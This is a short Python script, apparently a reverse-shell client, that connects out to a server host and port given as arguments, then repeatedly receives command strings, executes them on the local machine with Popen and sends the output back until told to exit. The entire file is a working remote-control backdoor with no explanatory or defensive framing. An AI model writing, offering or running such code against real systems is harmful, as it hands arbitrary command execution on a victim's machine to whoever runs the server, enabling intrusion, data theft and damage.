import sys, shlex, os
from subprocess import Popen, PIPE
from socket import *
serverName = sys.argv[1]
serverPort = int(sys.argv[2])
clientSocket = socket(AF_INET, SOCK_STREAM)

try:
    clientSocket.connect((serverName, serverPort))
except:
    print("Error connecting to server, quitting...")
    sys.exit()   
clientSocket.send(("Connected...enter commands").encode())


#RECEIVE INITIAL COMMAND
command = (clientSocket.recv(4064)).decode()
args = shlex.split(command)

while (command != "exit"):
    try:
        
        #PROCESS THE COMMAND
        process = Popen(args, stdout=PIPE, stderr=PIPE)        
        result, err = process.communicate(timeout=10)
               

        #SEND RESULT TO SERVER
        clientSocket.send(result)

        #RECEIVE NEW COMMAND
        command = (clientSocket.recv(4064)).decode()
        args = shlex.split(command)
    except Exception as exc:
        print(exc)
        command = (clientSocket.recv(4064)).decode()
        args = shlex.split(command)

clientSocket.close()
